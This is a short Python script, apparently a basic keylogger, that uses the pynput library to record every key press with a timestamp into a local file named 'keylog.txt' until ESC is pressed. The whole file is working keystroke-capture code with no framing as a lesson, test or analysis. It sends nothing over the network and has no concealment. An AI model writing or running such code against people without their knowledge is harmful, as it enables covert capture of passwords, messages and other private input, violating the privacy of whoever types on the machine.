from pynput import keyboard
import datetime

# File to store keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            # Record the key and timestamp
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            key_str = str(key.char)
            file.write(f"[{current_time}] {key_str}\n")
    except AttributeError:
        # Special keys (e.g., space, enter, ctrl)
        with open(log_file, "a") as file:
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            file.write(f"[{current_time}] [{key}]\n")

def on_release(key):
    # Stop logging on pressing ESC
    if key == keyboard.Key.esc:
        return False

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
